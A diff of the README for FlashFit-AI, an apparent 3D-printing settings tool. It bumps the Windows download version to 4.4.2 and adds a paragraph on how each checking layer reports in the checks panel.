@@ -10,7 +10,7 @@ combination of settings for each model and material is still needlessly hard.
 
 ## Downloads
 
-### Windows 11 x64 — 4.4.1 · current
+### Windows 11 x64 — 4.4.2 · current
 
 [**FlashFit-AI-Windows-11-x64.zip**](https://github.com/alexmark53343-byte/FlashFit-AI/raw/main/downloads/FlashFit-AI-Windows-11-x64.zip) · 3.4 MB
 
@@ -118,6 +118,12 @@ much, so a misclassification that made the print *worse* passed untouched —
 rule and wrong. The class is now verified against the mesh, and solidity is
 ignored outright when the mesh is not closed, because a mesh with holes has no
 volume and every number derived from it is an artefact.
+
+Each layer reports for itself in the checks panel, and each row is always
+present — a layer that is only visible when it objects cannot be told apart from
+one that is not running. The model row says what it recognised, the guardrail
+row says whether that was believed, and the S.O.G row says what happened to the
+profile.
 
 S.O.G's use of the model is **monotone**: every answer it can give either leaves
 a safety margin where it was or widens it. The worst case of a wrong answer is a
